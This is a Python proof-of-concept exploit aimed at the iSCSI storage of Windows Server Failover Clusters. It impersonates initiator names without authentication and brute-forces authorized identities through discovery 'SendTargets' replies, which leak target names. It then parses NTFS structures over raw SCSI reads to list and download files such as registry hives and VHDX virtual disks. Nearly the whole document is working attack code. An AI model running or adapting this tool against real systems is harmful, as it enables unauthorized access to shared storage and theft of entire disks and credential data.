#!/usr/bin/env python3

import argparse, struct, sys, socket, hashlib, os

def log(msg):
    print(msg)

def progress(msg):
    """Redraw the current stdout line in place (interactive terminals). When
    stdout is redirected, fall back to a normal line so logs stay readable."""
    if sys.stdout.isatty():
        sys.stdout.write('\r\x1b[K' + msg)   # CR + clear-to-EOL, no newline
        sys.stdout.flush()
    else:
        print(msg)

def kvp(pairs):
    out = b''
    for k, v in pairs:
        out += b'%s=%s\x00' % (k.encode(), v.encode())
    return out + b'\x00' * ((4 - (len(out) % 4)) % 4)

# ------------------------------------------------------------------ PDU build

def login_req(itt, kvps, csg, nsg, isid, tsih=0, cid=1, cmdsn=1, expstatsn=1, transit=True):
    data = kvp(kvps)
    flags = (0x80 if transit else 0) | (nsg & 3) | ((csg & 3) << 2)
    b = bytearray(48)
    b[0] = 0x03; b[1] = flags; b[2] = 0; b[3] = 0; b[4] = 0
    b[5] = (len(data) >> 16) & 0xFF; b[6] = (len(data) >> 8) & 0xFF; b[7] = len(data) & 0xFF
    b[8:14] = isid; b[14:16] = struct.pack('>H', tsih)
    b[16:20] = struct.pack('>I', itt); b[20:22] = struct.pack('>H', cid)
    b[24:28] = struct.pack('>I', cmdsn); b[28:32] = struct.pack('>I', expstatsn)
    return bytes(b) + data

def text_req(itt, kvps, cmdsn=1, expstatsn=1, ttt=0xFFFFFFFF, final=True):
    data = kvp(kvps)
    b = bytearray(48)
    b[0] = 0x04; b[1] = 0x80 if final else 0; b[4] = 0
    b[5] = (len(data) >> 16) & 0xFF; b[6] = (len(data) >> 8) & 0xFF; b[7] = len(data) & 0xFF
    b[16:20] = struct.pack('>I', itt); b[20:24] = struct.pack('>I', ttt)
    b[24:28] = struct.pack('>I', cmdsn); b[28:32] = struct.pack('>I', expstatsn)
    return bytes(b) + data

def scsi_cmd(itt, cdb, edtl, lun=b'\x00' * 8, cmdsn=2, expstatsn=1, read=True):
    cdb = bytes(cdb) + b'\x00' * (16 - len(cdb))
    b = bytearray(48)
    b[0] = 0x01
    b[1] = 0x80 | (0x40 if read else 0) | 0x01
    b[4] = 0
    b[8:16] = lun
    b[16:20] = struct.pack('>I', itt)
    b[20:24] = struct.pack('>I', edtl)
    b[24:28] = struct.pack('>I', cmdsn)
    b[28:32] = struct.pack('>I', expstatsn)
    b[32:48] = cdb
    return bytes(b)

# ------------------------------------------------------------------ session

class IscsiSession:
    def __init__(self, portal, port, target, initiator):
        self.portal = portal
        self.port = port
        self.target = target
        self.initiator = initiator
        self.isid = self._default_isid(initiator)
        self.sock = None
        self.cmdsn = 1       # leading login CmdSN; first FFP cmd also uses it
        self.expstatsn = 1   # next expected target StatSN
        self.itt = 0x10000000
        self.tsih = 0
        self.ffp = False

    @staticmethod
    def _default_isid(initiator):
        """Unstable-but-deterministic ISID derived from the initiator name (6 bytes).
        Windows initiators use ISID 01:00:01:37:00:00 style; derive the last 4 bytes
        from the name hash so the value is not a hard-coded lab constant."""
        h = hashlib.sha256(initiator.encode()).digest()
        return bytes([0x01, 0x00, 0x01]) + h[:3]

    def _next_itt(self):
        self.itt += 1
        return self.itt

    def _recv(self, timeout=8):
        s = self.sock
        s.settimeout(timeout)
        hdr = b''
        try:
            while len(hdr) < 48:
                c = s.recv(48 - len(hdr))
                if not c:
                    return None, b''
                hdr += c
        except socket.timeout:
            return None, b''
        dsl = (hdr[5] << 16) | (hdr[6] << 8) | hdr[7]
        total = dsl + ((4 - (dsl % 4)) % 4)
        body = b''
        if total:
            try:
                while len(body) < total:
                    c = s.recv(total - len(body))
                    if not c:
                        break
                    body += c
            except socket.timeout:
                pass
        return hdr, body[:dsl]

    def connect(self):
        self.sock = socket.socket()
        self.sock.settimeout(8)
        self.sock.connect((self.portal, self.port))
        return self

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    def login(self, session_type='Normal', target=None):
        """Full login loop. Returns True on Full Feature Phase."""
        target = target or self.target
        kvps = [('InitiatorName', self.initiator), ('SessionType', session_type)]
        if session_type == 'Normal':
            kvps.append(('TargetName', target))
        kvps.append(('AuthMethod', 'None'))
        csg, nsg, rnd = 0, 1, 1
        while True:
            kv = kvps
            if rnd == 2:
                kv = [('HeaderDigest', 'None'), ('DataDigest', 'None'),
                      ('MaxRecvDataSegmentLength', '65536'),
                      ('DefaultTime2Wait', '0'), ('DefaultTime2Retain', '60')]
            elif rnd > 2:
                kv = []
            pdu = login_req(self._next_itt(), kv, csg, nsg, self.isid,
                            cmdsn=self.cmdsn, expstatsn=self.expstatsn)
            self.sock.sendall(pdu)
            hdr, body = self._recv()
            if hdr is None:
                log('  LOGIN%d: no reply' % rnd); return False
            status = (hdr[36] << 8) | hdr[37]
            statsn = struct.unpack('>I', hdr[24:28])[0]
            tsih = struct.unpack('>H', hdr[14:16])[0]
            flags = hdr[1]
            kvout = {}
            for part in body.split(b'\x00'):
                if b'=' in part:
                    k, v = part.split(b'=', 1)
                    kvout[k.decode(errors='replace')] = v.decode(errors='replace')
            self.expstatsn = statsn + 1
            if tsih:
                self.tsih = tsih
            if status != 0:
                log('  LOGIN FAILED status=0x%04x' % status); return False
            if (flags & 0x80) and (flags & 0x03) == 3:
                self.ffp = True
                return True
            csg = (flags & 0x03) if (flags & 0x03) in (0, 1) else 1
            nsg = 3
            rnd += 1
            if rnd > 8:
                log('  login did not converge'); return False

    def exchange_text(self, kvps):
        ttt = 0xFFFFFFFF
        first = True
        allbody = b''
        for _ in range(10):
            kv = kvps if first else []
            pdu = text_req(self._next_itt(), kv, cmdsn=self.cmdsn,
                           expstatsn=self.expstatsn, ttt=ttt)
            self.cmdsn += 1
            self.sock.sendall(pdu)
            hdr, body = self._recv()
            if hdr is None:
                return None
            statsn = struct.unpack('>I', hdr[24:28])[0]
            self.expstatsn = statsn + 1
            allbody += body
            if hdr[1] & 0x80:
                return allbody
            ttt = struct.unpack('>I', hdr[20:24])[0]
            first = False
        return allbody

    def scsi(self, cdb, edtl, read=True, maxpdu=6, verbose=True):
        """Send SCSI command; return (data_bytes, info). Handles Data-In + SCSI Response."""
        itt = self._next_itt()
        cmdsn_used = self.cmdsn
        self.cmdsn += 1
        pdu = scsi_cmd(itt, cdb, edtl, cmdsn=cmdsn_used, expstatsn=self.expstatsn, read=read)
        self.sock.sendall(pdu)
        data = b''
        info = {}
        for _ in range(maxpdu):
            hdr, body = self._recv()
            if hdr is None:
                log('  no reply'); break
            op = hdr[0] & 0x3F
            statsn = struct.unpack('>I', hdr[24:28])[0]
            if op == 0x25:  # Data-In
                sbit = hdr[1] & 0x01
                dsn = struct.unpack('>I', hdr[36:40])[0]
                off = struct.unpack('>I', hdr[40:44])[0]
                res = struct.unpack('>I', hdr[44:48])[0]
                self.expstatsn = statsn + 1
                info.update({'data_sn': dsn, 'offset': off, 'residual': res,
                             'sbit': bool(sbit), 'status': hdr[3], 'statsn': statsn})
                data += body
                if sbit:
                    break
            elif op == 0x21:  # SCSI Response
                self.expstatsn = statsn + 1
                info.update({'response': hdr[2], 'status': hdr[3], 'statsn': statsn,
                             'residual': struct.unpack('>I', hdr[44:48])[0]})
                break
            elif op in (0x20, 0x32):
                if verbose:
                    log('    async op=0x%02x skip' % op)
                continue
            elif op == 0x3F:
                info['reject'] = hdr[2]
                log('    REJECT reason=0x%02x' % hdr[2]); break
            else:
                log('    unexpected op=0x%02x' % op); break
        return data, info

# ------------------------------------------------------------------ CDBs

def cdb_read10(lba, blocks=1):
    c = bytearray(16); c[0] = 0x28
    c[2] = (lba >> 24) & 0xFF; c[3] = (lba >> 16) & 0xFF
    c[4] = (lba >> 8) & 0xFF; c[5] = lba & 0xFF
    c[7] = (blocks >> 8) & 0xFF; c[8] = blocks & 0xFF
    return bytes(c)

# ------------------------------------------------------------------ commands

def cmd_probe(args):
    s = IscsiSession(portal=args.portal, port=args.port, target=args.target, initiator=args.ini).connect()
    if not s.login('Discovery'):
        log('[-] discovery login failed')
        return 1
    body = s.exchange_text([('SendTargets', 'All')])
    if body is None:
        log('[-] SendTargets: no reply'); return 1
    log('[+] target(s) for initiator:')
    if body:
        for part in body.split(b'\x00'):
            if b'=' in part:
                k, v = part.split(b'=', 1)
                log('    %s=%s' % (k.decode(errors='replace'), v.decode(errors='replace')))
        log('[+] authorized member: target enumerable')
    else:
        log('[-] not authorized: SendTargets empty')
    s.close(); return 0

def _expand_ini_list(raw):
    """Expand candidate list from args: --ini-list can contain bare IQNs,
    comma-separated IQNs, and '@path' references to a file (one IQN per line,
    '#' comments allowed). Returns de-duplicated list."""
    cands = []
    for item in (raw or []):
        if item.startswith('@'):
            try:
                with open(item[1:], 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        cands.append(line)
            except OSError as e:
                log('  warning: cannot read %s: %s' % (item[1:], e))
            continue
        for part in str(item).split(','):
            part = part.strip()
            if part:
                cands.append(part)
    seen = set()
    uniq = []
    for c in cands:
        if c not in seen:
            seen.add(c)
            uniq.append(c)
    return uniq

def cmd_oracle(args):
    """Brute-force the TARGET IQN (and which source IQNs are authorized) WITHOUT
    knowing either in advance.

    For each candidate source IQN:
      1. DISCOVERY login (SessionType=Discovery, AuthMethod=None) — RFC 3720 permits
         discovery with NO TargetName.  This never needs the target IQN.
      2. SendTargets=All on that discovery session.
         - If the source IQN is authorized: the target returns
           TargetName=<target IQN> + TargetAddress — the target name is LEAKED.
         - If not authorized: empty response (member oracle = 0x0000 vs empty).
    So a list of candidate source IQNs (no target knowledge needed) yields:
      - which source IQNs are valid sign-in identities, AND
      - the actual target IQN served per valid source.
    """
    names = _expand_ini_list(args.ini_list)
    if not names and args.ini:
        names = [args.ini]
    if not names:
        log('[-] oracle: provide candidate source IQNs via --ini-list '
            '(space/comma separated, or @file) or --ini')
        return 1
    log('[+] oracle: %d candidate initiators' % len(names))
    found = []
    for nm in names:
        # Discovery login needs NO TargetName; pass a dummy only to satisfy the
        # IscsiSession constructor (SessionType=Discovery ignores it).
        s = IscsiSession(portal=args.portal, port=args.port, target='(discovery)',
                         initiator=nm).connect()
        if not s.login('Discovery'):
            log('[-] %s: discovery login failed' % nm)
            s.close(); continue
        body = s.exchange_text([('SendTargets', 'All')])
        if body:
            tn = None; ta = None
            for part in body.split(b'\x00'):
                if b'=' in part:
                    k, v = part.split(b'=', 1)
                    if k == b'TargetName':
                        tn = v.decode(errors='replace')
                    elif k == b'TargetAddress':
                        ta = v.decode(errors='replace')
            log('[+] %s: authorized | %s' % (nm, tn or '?'))
            if tn and tn not in [f[0] for f in found]:
                found.append((tn, ta))
        else:
            log('[-] %s: not authorized' % nm)
        s.close()
    log('[+] target IQN(s): %s' % (found if found else 'NONE'))
    return 0

def _ensure_ffp_session(args):
    s = IscsiSession(portal=args.portal, port=args.port, target=args.target, initiator=args.ini).connect()
    if not s.login('Normal', target=args.target):
        log('[-] login failed (target may require CHAP or be unavailable)')
        s.close()
        return None
    return s

def cmd_login(args):
    s = _ensure_ffp_session(args)
    if s:
        log('[+] login successful (FFP, tsih=%d)' % s.tsih)
        s.close(); return 0
    log('[-] login failed')
    return 1

def _parse_runs(blob):
    """Parse NTFS data-run list (attribute 0x80 non-resident). Returns [(length_cn, delta_lcn)]."""
    runs = []
    i = 0
    while i < len(blob):
        hdr = blob[i]; i += 1
        if hdr == 0:
            break
        llen = hdr & 0x0F
        olen = (hdr >> 4) & 0x0F
        if i + llen + olen > len(blob):
            break
        lval = int.from_bytes(blob[i:i + llen], 'little'); i += llen
        oval = int.from_bytes(blob[i:i + olen], 'little') if olen else 0; i += olen
        if olen and (oval >> (olen * 8 - 1)) & 1:
            oval -= (1 << (olen * 8))
        runs.append((lval, oval))
    return runs

def _ntfs_scan(s, part_start, mft_lba, spc, maxrec=128):
    """Read $MFT records; return [{rec,name,parent,size,runs,resident}] (READ-ONLY)."""
    out = []
    for recno in range(0, maxrec):
        d1 = s.scsi(cdb_read10(mft_lba + recno * 2, 1), 512, verbose=False)[0]
        d2 = s.scsi(cdb_read10(mft_lba + recno * 2 + 1, 1), 512, verbose=False)[0]
        rec = (d1 or b'') + (d2 or b'')
        if len(rec) < 1024 or rec[0:4] != b'FILE':
            continue
        name = ''; size = 0; parent = 0
        runs = []; resident = None
        off = 56
        while off < len(rec) - 8:
            atype = struct.unpack('<I', rec[off:off + 4])[0]
            alen = struct.unpack('<I', rec[off + 4:off + 8])[0]
            if atype == 0xFFFFFFFF or alen == 0:
                break
            nonres = rec[off + 8] & 0x01
            if atype == 0x30 and nonres == 0:
                vlen = struct.unpack('<I', rec[off + 16:off + 20])[0]
                voff = struct.unpack('<H', rec[off + 20:off + 22])[0]
                if voff + vlen <= len(rec) - off:
                    pay = rec[off + voff:off + voff + vlen]
                    if len(pay) >= 66:
                        parent = struct.unpack('<Q', pay[0:8])[0]
                        nl = pay[64]
                        name = pay[66:66 + nl * 2].decode('utf-16-le', 'replace')
            if atype == 0x80:
                if nonres:
                    size = struct.unpack('<Q', rec[off + 48:off + 56])[0]
                    runs_off = struct.unpack('<H', rec[off + 32:off + 34])[0]
                    runs = _parse_runs(rec[off + runs_off:off + alen])
                else:
                    vlen = struct.unpack('<I', rec[off + 16:off + 20])[0]
                    voff = struct.unpack('<H', rec[off + 20:off + 22])[0]
                    resident = rec[off + voff:off + voff + vlen]
                    size = vlen
            off += alen
        if name:
            out.append({'rec': recno, 'name': name, 'parent': parent, 'size': size,
                        'runs': runs, 'resident': resident})
    return out

def _open_ntfs(args):
    """Login + return (session, part_start, spc, mft_lba)."""
    s = _ensure_ffp_session(args)
    if not s:
        return None
    gpt, _ = s.scsi(cdb_read10(1, 1), 512)
    if not gpt or gpt[0:8] != b'EFI PART':
        log('no GPT header'); s.close(); return None
    ents, _ = s.scsi(cdb_read10(2, 1), 512)
    part_start = None
    if ents:
        for i in range(4):
            e = ents[i * 128:(i + 1) * 128]
            if not e or len(e) < 128:
                break
            first = struct.unpack('<Q', e[32:40])[0]
            last = struct.unpack('<Q', e[40:48])[0]
            nm = e[56:128].decode('utf-16-le', 'replace').rstrip('\x00')
            if first and last and 'reserved' not in nm.lower():
                part_start = first
    if part_start is None:
        part_start = 32768
    boot, _ = s.scsi(cdb_read10(part_start, 1), 512)
    if not boot or boot[3:11] != b'NTFS    ':
        log('no NTFS boot'); s.close(); return None
    bps = struct.unpack('<H', boot[11:13])[0]
    spc = boot[13]
    mft_cluster = struct.unpack('<Q', boot[48:56])[0]
    return (s, part_start, spc, part_start + mft_cluster * spc)

def _resolve_path(entries, path):
    """Resolve a Windows-style path ('\\Cluster', 'Cluster\\0.hive', '.') to an entry.
    Uses parent record refs. Returns entry or None."""
    parts = [p for p in path.replace('\\', '/').split('/') if p]
    if not parts:
        return None
    # root directory is record 5; top-level entries have parent == 5 (root).
    # Walk by parent rec number: component N must have parent == current dir rec.
    cur = None
    for comp in parts:
        if cur is None:
            # Records 0-4 are system files w/ parent 0; real top-level are parent=5.
            cands = [e for e in entries if e['name'].lower() == comp.lower() and (e['parent'] & 0xFFFF) == 5]
        else:
            currec = cur['rec']
            cands = [e for e in entries if e['name'].lower() == comp.lower() and (e['parent'] & 0xFFFF) == currec]
        if not cands:
            return None
        cur = cands[0]
    return cur

def _list_dir(entries, parent_rec):
    """Return entries whose parent record == parent_rec."""
    return [e for e in entries if (e['parent'] & 0xFFFF) == parent_rec]

def cmd_ls(args):
    """List files/dirs from $MFT. With --path, list that directory's children (read-only)."""
    res = _open_ntfs(args)
    if not res:
        return 1
    s, part_start, spc, mft_lba = res
    entries = _ntfs_scan(s, part_start, mft_lba, spc, args.maxrec or 4096)
    if args.path and args.path not in ('.', '\\', '/'):
        target = _resolve_path(entries, args.path)
        if target is None:
            log('[-] path not found: %r' % args.path)
            s.close(); return 1
        children = _list_dir(entries, target['rec'])
        log('[+] %s (%d entries):' % (args.path, len(children)))
        for c in sorted(children, key=lambda x: x['name']):
            log('    [%d] %-48s %d' % (c['rec'], c['name'], c['size']))
    else:
        # root listing: entries whose parent is root record 5
        children = _list_dir(entries, 5)
        log('[+] root (%d entries):' % len(children))
        for c in sorted(children, key=lambda x: x['name']):
            log('    [%d] %-48s %d' % (c['rec'], c['name'], c['size']))
    s.close()
    return 0

def cmd_download(args):
    """Download a file by name or path from the volume to local disk (READ(10) only).

    STREAMED: the file is written chunk-by-chunk to disk via 16KB READ(10) bursts —
    no full-file buffer in RAM, so multi-GB VHDs don't exhaust memory or kill the
    process. SHA256 is computed on the fly; progress is printed every 32 MB.

    Usage:
      download --name <basename>        exact $MFT basename (e.g. '0.hive')
      download --path <win path>        e.g. 'testvm/Virtual Hard Disks/testvm.vhdx'
    """
    res = _open_ntfs(args)
    if not res:
        return 1
    s, part_start, spc, mft_lba = res
    maxrec = args.maxrec or 4096
    entries = _ntfs_scan(s, part_start, mft_lba, spc, maxrec)
    target_name = args.name
    target_path = args.path
    ent = None
    if target_path:
        ent = _resolve_path(entries, target_path)
        if not ent:
            log('[-] path not found in first %d $MFT records: %r '
                '(try --maxrec <larger>)' % (maxrec, target_path))
            s.close(); return 1
    elif target_name:
        matches = [e for e in entries if e['name'] == target_name]
        if not matches:
            log('[-] file not found in first %d $MFT records: %r '
                '(try --maxrec <larger>)' % (maxrec, target_name))
            s.close(); return 1
        ent = matches[0]
    else:
        log('[-] use --name <basename> or --path <path>'); s.close(); return 1
    out = args.out or ('downloads/' + ent['name'].replace('/', '_'))
    os.makedirs(os.path.dirname(out) or '.', exist_ok=True)
    log('[+] %s (%d bytes, %d runs) -> %s' % (ent['name'], ent['size'], len(ent['runs']), out))
    sha = hashlib.sha256()
    written = 0
    expect = ent['size']
    progressing = False   # a progress line is currently held open (no newline)
    with open(out, 'wb') as f:
        if ent['resident'] is not None:
            f.write(ent['resident']); sha.update(ent['resident']); written = len(ent['resident'])
        else:
            lcn = 0
            pos = 0
            for (length, delta) in ent['runs']:
                if delta == 0:
                    # sparse run: zeros, no disk clusters (advance logical only)
                    pos += length * spc * 512
                    continue
                lcn += delta
                lba = part_start + lcn * spc
                run_bytes = length * spc * 512
                run_left = min(run_bytes, expect - pos)
                got = 0
                while got < run_left:
                    chunk = min(16384, run_left - got)  # 32 sectors
                    blocks = chunk // 512
                    d = s.scsi(cdb_read10(lba + (got // 512), blocks), chunk, verbose=False)[0]
                    if d is None or len(d) != chunk:
                        if progressing and sys.stdout.isatty():
                            print(); progressing = False
                        log('[-] read short at lba+%d (got %d/%d)' % (got // 512, len(d or b''), chunk))
                        break
                    f.write(d); sha.update(d); written += len(d); got += chunk
                    if (written // (32 * 1024 * 1024)) != ((written - len(d)) // (32 * 1024 * 1024)):
                        progress('[+] ... %d / %d bytes (%.0f%%)'
                                 % (written, expect, 100.0 * written / expect if expect else 100.0))
                        progressing = True
                pos += run_bytes
                if written >= expect:
                    break
    if progressing and sys.stdout.isatty():
        print()   # close the in-place progress line before the summary
    log('[+] saved %d bytes -> %s' % (written, out))
    log('[+] sha256=%s' % sha.hexdigest())
    if expect and written != expect:
        log('[-] WARNING: size mismatch — wrote %d of %d bytes (incomplete/sparse?)' % (written, expect))
    s.close()
    return 0

# ------------------------------------------------------------------ main

def main():
    ap = argparse.ArgumentParser(
        description='WSFC iSCSI storage-plane POC (read-only). All connection '
                    'parameters are user-supplied via arguments.',
        formatter_class=argparse.RawDescriptionHelpFormatter)
    # Connection args are global: they precede the subcommand, e.g.
    #   poc.py --portal 10.14.10.10 --ini <iqn> --target <iqn> ls --path "..."
    ap.add_argument('--portal', required=True, help='iSCSI portal host/IP (e.g. 10.10.10.10)')
    ap.add_argument('--port', type=int, default=3260, help='portal TCP port (default 3260)')
    ap.add_argument('--target', default=None,
                    help='target IQN (required by all commands except oracle, which ignores it)')
    ap.add_argument('--ini', required=False,
                    help='initiator IQN to claim (e.g. iqn.1991-05.com.microsoft:node01)')

    sub = ap.add_subparsers(dest='cmd', required=True)

    # commands needing only a connection
    sub.add_parser('probe')
    sub.add_parser('login')

    # oracle: discovery-only; target not needed, candidate list is the input
    sp = sub.add_parser('oracle')
    sp.add_argument('--ini-list', nargs='+', default=None,
                    help='candidate initiator IQNs to test: space-separated, '
                         'comma-separated, or @file (one IQN per line, # comments)')

    # ls: NTFS directory listing
    sp = sub.add_parser('ls')
    sp.add_argument('--path', default=None, help='directory to list (default: volume root)')
    sp.add_argument('--maxrec', type=int, default=None, help='max $MFT records to scan (default 4096)')

    # download: stream a file off the volume to local disk
    sp = sub.add_parser('download')
    sp.add_argument('--name', default=None, help='exact $MFT basename to fetch')
    sp.add_argument('--path', default=None, help='Windows-style path to fetch')
    sp.add_argument('--out', default=None, help='local destination path (default: artifacts/downloads/<name>)')
    sp.add_argument('--maxrec', type=int, default=None, help='max $MFT records to scan (default 4096)')

    args = ap.parse_args()

    fns = {'probe': cmd_probe, 'oracle': cmd_oracle, 'login': cmd_login,
           'ls': cmd_ls, 'download': cmd_download}
    return fns[args.cmd](args)

if __name__ == '__main__':
    sys.exit(main())
